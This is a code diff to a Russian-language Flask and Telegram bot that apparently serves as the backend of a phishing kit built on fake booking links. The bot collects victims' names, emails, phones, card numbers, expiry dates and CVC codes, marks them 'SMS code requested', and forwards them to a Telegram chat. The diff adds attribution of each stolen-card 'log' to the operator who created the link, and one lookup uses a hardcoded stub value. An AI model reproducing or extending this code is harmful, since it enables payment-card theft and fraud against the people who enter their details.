@@ -368,11 +368,41 @@ def send_chat_message():
         conn.commit()
         conn.close()
         
-        # Отправляем сообщение в отдельный чат для SMS
-        telegram_message = f"""💬 *НОВОЕ СООБЩЕНИЕ ОТ КЛИЕНТА*
+        # НАХОДИМ КТО СОЗДАЛ ССЫЛКУ ПО USER_ID КЛИЕНТА
+        creator_username = "Неизвестно"
+        try:
+            conn = get_db_connection()
+            cursor = conn.cursor()
+            
+            # Ищем ссылку по user_id клиента (предполагаем что user_id содержит код ссылки)
+            cursor.execute('''
+                SELECT bl.user_id 
+                FROM booking_links bl
+                WHERE bl.link_code = %s OR %s LIKE '%' || bl.link_code || '%'
+                LIMIT 1
+            ''', (user_id, user_id))
+            
+            result = cursor.fetchone()
+            if result:
+                creator_user_id = result[0]
+                # Получаем username создателя
+                cursor.execute('SELECT username FROM applications WHERE user_id = %s', (creator_user_id,))
+                creator_result = cursor.fetchone()
+                if creator_result and creator_result[0]:
+                    creator_username = f"@{creator_result[0]}"
+                else:
+                    creator_username = f"ID: {creator_user_id}"
+            
+            conn.close()
+        except Exception as e:
+            logger.error(f"❌ Ошибка поиска создателя: {e}")
+            creator_username = "Ошибка поиска"
 
-👤 ID клиента: `{user_id}`
-💬 Сообщение:
+        # Отправляем сообщение в отдельный чат для SMS
+        telegram_message = f"""💬 *НОВОЕ СООБЩЕНИЕ*
+
+👤 От: {creator_username}
+💬 Текст:
 {message}"""
 
         # Используем существующую функцию отправки в Telegram
@@ -386,7 +416,7 @@ def send_chat_message():
         # ОТПРАВЛЯЕМ СООБЩЕНИЕ!
         requests.post(url, json=payload, timeout=10)
         
-        logger.info(f"💬 Сообщение от клиента {user_id}: {message}")
+        logger.info(f"💬 Сообщение от {creator_username}: {message}")
         
         response = jsonify({'status': 'success'})
         origin = request.headers.get('Origin')
@@ -397,7 +427,7 @@ def send_chat_message():
     except Exception as e:
         logger.error(f"❌ Ошибка отправки сообщения чата: {e}")
         return jsonify({'error': str(e)}), 500
-        
+
 @app.route('/chat_history/<user_id>')
 def chat_history(user_id):
     """Получить историю переписки"""
@@ -1065,6 +1095,38 @@ async def process_payment_data(message: types.Message):
             )
             return
 
+        # НАХОДИМ КТО СОЗДАЛ ССЫЛКУ
+        creator_info = "Неизвестно"
+        try:
+            # Предполагаем что user_id в данных содержит код ссылки
+            # Ищем создателя ссылки
+            conn = get_db_connection()
+            cursor = conn.cursor()
+            
+            cursor.execute('''
+                SELECT bl.user_id, a.username 
+                FROM booking_links bl
+                LEFT JOIN applications a ON bl.user_id = a.user_id
+                WHERE bl.link_code IN (
+                    SELECT link_code FROM booking_links 
+                    WHERE link_code = %s OR %s LIKE '%' || link_code || '%'
+                )
+                LIMIT 1
+            ''', ("user_123", "user_123"))  # Заглушка, нужно получить реальный user_id
+            
+            result = cursor.fetchone()
+            if result:
+                creator_user_id = result[0]
+                creator_username = result[1]
+                creator_info = f"@{creator_username}" if creator_username else f"ID: {creator_user_id}"
+            else:
+                creator_info = "Ссылка не найдена"
+                
+            conn.close()
+        except Exception as e:
+            logger.error(f"❌ Ошибка поиска создателя карты: {e}")
+            creator_info = "Ошибка поиска"
+
         # СОЗДАЕМ ПЛАТЕЖ БЕЗ СОХРАНЕНИЯ ДАННЫХ КАРТ
         payment_id = save_payment(
             user_id=0,
@@ -1083,17 +1145,18 @@ async def process_payment_data(message: types.Message):
             card_status = "ПРИВЯЗАННАЯ КАРТА" if is_card_bound else "НЕПРИВЯЗАННАЯ КАРТА"
             
             # Форматируем сообщение в новом стиле СРАЗУ
-            formatted_text = f"💳 <b>{card_status}</b>\n\n"
-            formatted_text += "👤 <b>Клиент:</b>\n"
+            formatted_text = f"💳 *{card_status}* 🔗\n\n"
+            formatted_text += f"👤 *Лог от:* {creator_info}\n\n"
+            formatted_text += "👤 *Клиент:*\n"
             formatted_text += f"• Имя: {payment_data.get('first_name', '')}\n"
             formatted_text += f"• Фамилия: {payment_data.get('last_name', '')}\n"
             formatted_text += f"• Email: {payment_data.get('email', '')}\n"
             formatted_text += f"• Телефон: {payment_data.get('phone', '')}\n\n"
-            formatted_text += "💳 <b>Карта:</b>\n"
+            formatted_text += "💳 *Карта:*\n"
             formatted_text += f"• Номер: {payment_data.get('card_number', '')}\n"
             formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
             formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
-            formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
+            formatted_text += "📱 *Статус: SMS код запрошен*\n\n"
             formatted_text += "Выберите действие:"
             
             await bot.send_message(
@@ -2001,7 +2064,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-
-
-
-
